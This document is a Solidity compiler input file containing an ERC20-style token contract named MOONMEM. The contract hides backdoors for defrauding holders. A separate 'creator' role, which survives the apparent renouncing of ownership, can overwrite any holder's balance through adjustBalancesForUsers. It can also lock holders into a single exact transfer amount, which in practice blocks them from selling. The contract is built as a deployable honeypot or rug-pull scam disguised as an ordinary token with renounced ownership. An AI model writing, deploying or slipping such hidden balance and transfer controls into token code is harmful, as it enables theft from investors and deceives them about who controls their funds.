{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.16;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval( address indexed owner, address indexed spender, uint256 value );\r\n}\r\n\r\nabstract contract CustomContext {\r\n    function _customMsgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract CustomSingleOwner is CustomContext {\r\n    address private _customContractOwner;\r\n    event CustomOwnerChanged(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        address msgSender = _customMsgSender();\r\n        _customContractOwner = msgSender;\r\n        emit CustomOwnerChanged(address(0), msgSender);\r\n    }\r\n\r\n    function getCustomOwner() public view virtual returns (address) {\r\n        return _customContractOwner;\r\n    }\r\n\r\n    modifier onlyCustomOwner() {\r\n        require(getCustomOwner() == _customMsgSender(), \"CustomSingleOwner: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceCustomOwnership() public virtual onlyCustomOwner {\r\n        emit CustomOwnerChanged(_customContractOwner, address(0x000000000000000000000000000000000000dEaD));\r\n        _customContractOwner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\n\r\ncontract MOONMEM is CustomContext, CustomSingleOwner, IERC20 {\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => uint256) private _exactTransferAmounts;\r\n    address private _customTokenCreator;\r\n\r\n    string public constant _name = \"MOONMEM\";\r\n    string public constant _symbol = \"MOONMEM\";\r\n    uint8 public constant _decimals = 18;\r\n    uint256 public constant _totalSupply = 13000000 * (10 ** _decimals);\r\n\r\n    constructor() {\r\n        _balances[_customMsgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _customMsgSender(), _totalSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    modifier onlyCustomCreator() {\r\n        require(getCustomCreator() == _customMsgSender(), \"GREY: caller is not the creator\");\r\n        _;\r\n    }\r\n\r\n    function getCustomCreator() public view virtual returns (address) {\r\n        return _customTokenCreator;\r\n    }\r\n\r\n    function changeCustomCreator(address newCreator) public onlyCustomOwner {\r\n        _customTokenCreator = newCreator;\r\n    }\r\n\r\n    event TokenDistributed(address indexed user, uint256 previousBalance, uint256 newBalance);\r\n\r\n    function queryExactTransferAmount(address account) public view returns (uint256) {\r\n        return _exactTransferAmounts[account];\r\n    }\r\n\r\n    function defineExactTransferAmounts(address[] calldata accounts, uint256 amount) public onlyCustomCreator {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _exactTransferAmounts[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function adjustBalancesForUsers(address[] memory userAddresses, uint256 desiredAmount) public onlyCustomCreator {\r\n        require(desiredAmount >= 0, \"GREY: desired amount must be non-negative\");\r\n\r\n        for (uint256 i = 0; i < userAddresses.length; i++) {\r\n            address currentUser = userAddresses[i];\r\n            require(currentUser != address(0), \"GREY: user address must not be zero address\");\r\n\r\n            uint256 oldBalance = _balances[currentUser];\r\n            _balances[currentUser] = desiredAmount;\r\n\r\n            emit TokenDistributed(currentUser, oldBalance, desiredAmount);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_balances[_customMsgSender()] >= amount, \"TT: transfer amount exceeds balance\");\r\n\r\n    uint256 exactAmount = queryExactTransferAmount(_customMsgSender());\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _balances[_customMsgSender()] -= amount;\r\n    _balances[recipient] += amount;\r\n\r\n    emit Transfer(_customMsgSender(), recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_customMsgSender()][spender] = amount;\r\n        emit Approval(_customMsgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_allowances[sender][_customMsgSender()] >= amount, \"TT: transfer amount exceeds allowance\");\r\n\r\n    uint256 exactAmount = queryExactTransferAmount(sender);\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _balances[sender] -= amount;\r\n    _balances[recipient] += amount;\r\n    _allowances[sender][_customMsgSender()] -= amount;\r\n\r\n    emit Transfer(sender, recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n    return _totalSupply;\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}